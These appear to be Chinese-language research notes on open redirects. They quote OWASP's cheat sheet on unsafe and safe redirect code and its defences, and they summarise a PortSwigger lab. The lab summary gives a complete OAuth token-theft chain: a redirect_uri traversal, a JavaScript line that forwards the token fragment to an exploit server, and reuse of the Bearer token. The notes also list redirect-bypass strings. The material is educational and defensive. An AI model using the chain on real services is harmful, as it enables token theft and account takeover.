# r815A 开放重定向 / Unvalidated Redirects and Forwards（全文 · 2026-11-27 实拉）

## 一手来源与逐字要点
1. OWASP Cheat Sheet Series《Unvalidated Redirects and Forwards Cheat Sheet》 — https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html （WebFetch 200 全文逐字）
   - 引言逐字：「Unvalidated redirects and forwards are possible when a web application accepts untrusted input that could cause the web application to redirect the request to a URL contained within untrusted input. By modifying untrusted URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts may have a more trustworthy appearance.」
   - 另一后果：「can also be used to maliciously craft a URL that would pass the application's access control check and then forward the attacker to privileged functions that they would normally not be able to access.」
   - 安全写法：URL 在代码里显式声明（`response.sendRedirect("http://www.mysite.com")` / `header("Location: ...")` / `redirect_to login_path`），攻击者无法操纵；PHP 例子须 `exit` 防止忽略重定向后继续执行剩余代码。
   - 危险写法：`response.sendRedirect(request.getParameter("url"))` / `$_GET['url']` / `request.QueryString["url"]` / `redirect_to params[:url]` / actix `query_string.path.as_str()` 插入 LOCATION；forward 面 `request.getRequestDispatcher(fwd).forward(...)` 可绕过访问控制到 admin.jsp。
   - ASP.NET MVC 1&2 的 `LogOn` 直接 `return Redirect(returnUrl)` 特别脆弱，需升 MVC 3。
   - 防御优先级逐字：「Simply avoid using redirects and forwards.」「If used, do not allow the URL as user input for the destination.」「Where possible, have the user provide short name, ID or token which is mapped server-side to a full target URL. This provides the highest degree of protection … Be careful that this doesn't introduce an enumeration vulnerability」「If user input can't be avoided, ensure that the supplied value is valid, appropriate for the application, and is authorized for the user.」「For local return URLs, use a framework helper that rejects non-local destinations, such as ASP.NET Core LocalRedirect or IsLocalUrl」「If external destinations are required, allow-list explicitly approved destinations using the parsed URL components」「Force all redirects to first go through a page notifying users that they are going off of your site, with the destination clearly displayed, and have them click a link to confirm.」
   - Validating URLs 逐字：「Use a maintained URL parser compatible with the redirect API and browser URL interpretation. Compare the parsed scheme, canonical host, and effective port against an explicit allowlist; constrain the path when only specific endpoints are permitted. Reject userinfo and ambiguous input, and redirect using the validated URL rather than transforming it afterward. Do not use raw prefix or suffix matching: GitLab demonstrates how userinfo and misleading hostnames bypass such checks. A server-side mapping from an approved destination ID remains preferable to accepting arbitrary URLs.」
2. PortSwigger Web Security Academy《Lab: Stealing OAuth access tokens via an open redirect》 — https://portswigger.net/web-security/oauth/lab-oauth-stealing-oauth-access-tokens-via-an-open-redirect （WebFetch 200 全文逐字）
   - OAuth 服务 redirect_uri 被白名单校验，外部域被拒；但默认值可追加额外字符包括 `/../` 路径穿越：`/oauth-callback/../post?postId=1` 被接受并最终跳到第一篇 post，access token 出现在 URL fragment。
   - 博客 `/post/next?path=[...]` 的 path 参数是开放重定向，可填绝对 URL 跳到任意域（exploit server）。
   - 组合链：`/auth?...&redirect_uri=https://<lab>/oauth-callback/../post/next?path=https://<exploit-server>/exploit&response_type=token&nonce=...&scope=openid%20profile%20email`，token 随 fragment 到 exploit server。
   - fragment 不经 HTTP 请求发到服务端，故须客户端 JS 读出：`window.location = '/?'+document.location.hash.substr(1)`，access log 里出现 `GET /?access_token=[...]`；完整 exploit 用 `if (!document.location.hash) {...} else {...}`。
   - 拿到 token 后替换 `GET /me` 的 `Authorization: Bearer` 取受害者 API key。
3. 交叉 WebSearch 逐字：itdef.net/zh-CN/glossary/open-redirect（CWE-601、CVSS 3.1 6.1、UI:R/S:C、RFC 9700 2025-01 要求 redirect_uri 完全一致比对 + 客户端与授权服务器都不得提供按参数任意转发的页面；`trusted-site.com.attacker-domain.example` 前缀绕过、`//attacker-domain.example` 协议相对）· securelayer7.net open-redirect.pdf（bypasses: `//evil.example`、`https://trusted.example.evil.example`、whitespace/encoding、`https://trusted.example@evil.example`；放大 SSRF/OAuth token theft）· miji.be（A01:2025 访问控制失效、短链服务闪屏页）。
